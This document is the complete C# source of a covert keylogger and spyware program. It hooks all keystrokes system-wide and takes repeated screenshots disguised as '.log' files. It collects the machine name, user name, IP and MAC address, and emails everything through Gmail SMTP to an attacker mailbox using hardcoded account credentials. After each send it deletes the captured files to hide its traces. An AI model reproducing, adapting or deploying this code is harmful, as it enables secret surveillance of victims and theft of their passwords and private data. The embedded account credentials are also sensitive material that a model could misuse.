using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace packages
{

    class Program
    {
        //done
        #region Set_Name
        //set Value (S: Success, F: Failure, C: Count)
        private static int connect = 0, disconnect = 0, mail_Body = 0, numb = 1, interval = 1, error = 0;
        private static int temp2;
        private static string copy_ip, err1 = "Good Image", err2 = "Good Log", err3 = "Good Remove Log", err4 = "Good Remove Exe", check_reset;
        //image
        private static string image_Name = "feedback_";
        private static string imageExtendtion = ".log";
        //set Name
        private static string log_Checking = "Right"; //done
        //private static string name_File = "Logs";
        //file
        private static string directoryImage = Application.StartupPath;
        private static string time_Now = DateTime.Now.ToLongTimeString();
        private static string date_Now = DateTime.Now.ToLongDateString();
        private static string time_date = DateTime.Now.ToLongTimeString() + " - " + DateTime.Now.Day + "/" + DateTime.Now.Month + "/" + DateTime.Now.Year;
        private static string path_Image1 = Application.StartupPath + "\\feedback_1.log";
        private static string path_Image2 = Application.StartupPath + "\\feedback_2.log";
        private static string path_Image3 = Application.StartupPath + "\\feedback_3.log";
        private static string path_File = Application.StartupPath + "\\uninstall.exe";
        //time Shot
        private static int captureTime = 100; //500=1s, 5000=10s, 30.000 = 1p, 120.000 = 4p                120000
        #endregion
        //done (Hook_Key_Board)
        #region Hook_Key_Board
        //set for key
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        #endregion
        //done (Write_File)
        #region Write_File
        private static string save_it;

        static void WriteLog(int vkCode)
        {
            StreamWriter sw = new StreamWriter(path_File, true);
            if (log_Checking == "Right")
            {
                sw.Write("\n");
                sw.Write("\nCopyright by HiLuv\n" + time_date);
                sw.Write("\n");
                log_Checking = "Left";
            }
            else { }
            save_it = "" + (Keys)vkCode + "-" + DateTime.Now.ToLongTimeString() + "\t\t" + date_Now + "\n";
            sw.WriteLine(save_it);
            sw.Close();
        }
        #endregion
        //done (capture)
        #region Capture
        static void CaptureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);
            // Save the screenshot to the specified path that the user has chosen.
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, image_Name + numb, imageExtendtion);
            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            { }
            numb++;
            //Screen == 3
            if (numb == 4 || numb > 3)
            {
                numb = 1;
            }
        }
        #endregion
        //done (create_folder)
        #region Create_Folder
        //Create_Folder_2
        static void created_2()
        {
            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            else { }
        }
        #endregion
        //done (timer)
        #region Timer
        static int temp1 = 1;
        //send
        static void timer_part1()
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);
                    if (temp1 == 55) { checking_Network(); temp1 = 1; }
                    temp1++;
                    if (temp1 >= 1000000) { temp1 = 1; }
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        //screen
        static void timer_part2()
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);
                    created_2();
                    temp2 = interval % captureTime;
                    if (temp2 == 0)
                    {
                        CaptureScreen();
                    }
                    else { }
                    interval++;
                    check_reset = ""+interval;
                    if (interval >= 100000)
                    {
                        interval = 0;
                        try
                        {
                            DirectoryInfo dir_Info1 = new DirectoryInfo(directoryImage);
                            foreach (FileInfo file_Info1 in dir_Info1.GetFiles("uninstall.exe"))
                            {
                                file_Info1.Delete();
                            }
                            check_reset = "Reset Done: " + interval;
                        }
                        catch (Exception e4)
                        {

                            err4 = "[Bad Remove Exe: ]: " + e4.ToString();
                        }
                    }
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion
        //done network
        #region Network
        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int conn, int val);
        static void checking_Network()
        {
            int Out;
            if (InternetGetConnectedState(out Out, 0) == true)
            {
                connect++;
                if (connect == 10)
                {
                    send_Mail();
                    connect = 0;
                    Console.WriteLine("Successfullyy !");
                }
                if (connect > 1000) { connect = 0; }
            }
            else
            {
                disconnect++;
                if (disconnect >= 100000) { disconnect = 0; }
            }
        }
        #endregion
        #region Send Mail
        static void send_Mail()
        {
            try
            {
                #region From,To,Password,Body
                mail_Body++;
                //from,to,pass
                string from_address = "hiluv.bot.sent@gmail.com";
                string to_address = "hiluv.bot.manager@gmail.com";
                string password = "bot.auto13579";
                //My ID
                string copy_IP = my_IP();
                string ip1 = @"https://checkip.com.vn/locator/?host=";
                string ip2 = @"&info=Ki%E1%BB%83m+tra+IP";
                string IP_Now = ip1 + copy_IP + ip2;
                copy_ip = IP_Now;
                //send
                MailMessage mail = new MailMessage();
                mail.Subject = date_Now + "</>IP [" + copy_IP + "]";//title
                mail.From = new MailAddress(from_address);
                mail.Body = "Maill [" + mail_Body + "]\nTime Current: " + time_Now + "\tTime : " + DateTime.Now.ToLongTimeString();
                mail.To.Add(new MailAddress(to_address));
                //Smtp
                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Port = 587;
                smtp.UseDefaultCredentials = false;
                smtp.EnableSsl = true;
                //Network
                NetworkCredential netC = new NetworkCredential(from_address, password);
                smtp.Credentials = netC;
                //My PC & User
                string pc_Name = System.Environment.MachineName;
                string user_Name = System.Environment.UserName;
                mail.Body += "\nIP Now: " + IP_Now + "\nMy PC: " + pc_Name + "\tName User: " + user_Name;
                //My MAC
                mail.Body += "\nMAC 1: " + GetMacAddress().ToString() + "\t(Ethernet Network Interfaces)\n===NOTE===\n";

                #endregion
                #region File
                try
                {
                    //Image
                    if (Directory.Exists(directoryImage))
                    {
                        mail.Attachments.Add(new Attachment(path_Image1));
                        mail.Attachments.Add(new Attachment(path_Image2));
                        mail.Attachments.Add(new Attachment(path_Image3));
                    }
                    else { }
                }
                catch (Exception e1)
                {
                    err1 = "[Bad Image]: " + e1.ToString();
                }
                try
                {
                    //logFile
                    if (File.Exists(path_File))
                    {
                        StreamReader sr = new StreamReader(path_File);
                        mail.Body += sr.ReadToEnd();
                        sr.Close();
                    }
                    else { }
                    mail.Body += "\n===>[Status]<===\nImage: " + err1 + "\nLog: " + err2 + "\nRemove Log: " + err3 + "\nRemove Image: " + err4 + "\nReset Exe:" + check_reset;
                    smtp.Send(mail);
                    mail.Attachments.Dispose();
                    Remove();
                    if (mail_Body >= 100000) { mail_Body = 0; }
                }
                catch (Exception e2)
                {
                    err2 = "[Bad Log]: " + e2.ToString();
                }
                #endregion

            }
            catch (Exception ex)
            {
                error++;
                //from,to,pass
                string from_address = "hiluv.bot.sent@gmail.com";
                string to_address = "hiluv.bot.manager@gmail.com";
                string password = "bot.auto13579";
                //https://myaccount.google.com/lesssecureapps
                //send
                MailMessage mail = new MailMessage();
                mail.Subject = "Mail Error SomeThing ?\t=>" + date_Now;
                mail.From = new MailAddress(from_address);
                mail.Body = "Mail Error [" + error + "]\nTime: " + time_Now + "\nDate: " + date_Now + "\tTime Now : " + DateTime.Now.ToLongTimeString();
                mail.To.Add(new MailAddress(to_address));
                //Smtp
                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Port = 587;
                smtp.UseDefaultCredentials = false;
                smtp.EnableSsl = true;
                //Network
                NetworkCredential netC = new NetworkCredential(from_address, password);
                smtp.Credentials = netC;
                //My PC & User
                string pc_Name = System.Environment.MachineName;
                string user_Name = System.Environment.UserName;
                mail.Body += "\nMy PC: " + pc_Name + "\tName User: " + user_Name;
                //My ID
                string copy_IP = my_IP();
                mail.Body += "\nMy ID: " + copy_IP + "\nIP Now" + copy_ip + "\nMAC 1: " + GetMacAddress().ToString() + "\t(Ethernet Network Interfaces)";
                mail.Body += "\n===>[Status]<===\nImage: " + err1 + "\nLog: " + err2 + "\nRemove Log: " + err3 + "\nRemove Image: " + err4 +"\nReset Exe:"+check_reset +"\nError\n" + ex.ToString();
                smtp.Send(mail);
                mail.Attachments.Dispose();
                //Remove();
                if (error >= 100000) { error = 0; }
            }
        }
        #endregion
        #region Remove
        static void Remove()
        {
            try
            {
                DirectoryInfo dir_Info = new DirectoryInfo(directoryImage);
                foreach (FileInfo file_Info in dir_Info.GetFiles("*.log"))
                {
                    file_Info.Delete();
                }
            }
            catch (Exception e3)
            {
                err3 = "[Bad Remove Log: ]: " + e3.ToString();
            }

        }
        #endregion
        #region Take_IP
        private static string my_IP()
        {
            string Address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                Address = stream.ReadToEnd();
            }
            int first = Address.IndexOf("Address: ") + 9;
            int last = Address.IndexOf("</body>");
            Address = Address.Substring(first, last - first);
            return Address;
        }
        #endregion
        #region Take MAC Address
        public static PhysicalAddress GetMacAddress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.GetPhysicalAddress();
                }
            }
            return null;
        }
        #endregion
        //
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        static void Main(string[] args)
        {
            timer_part2(); //screen
            timer_part1(); //send
            HookKeyboard();
        }
    }
}
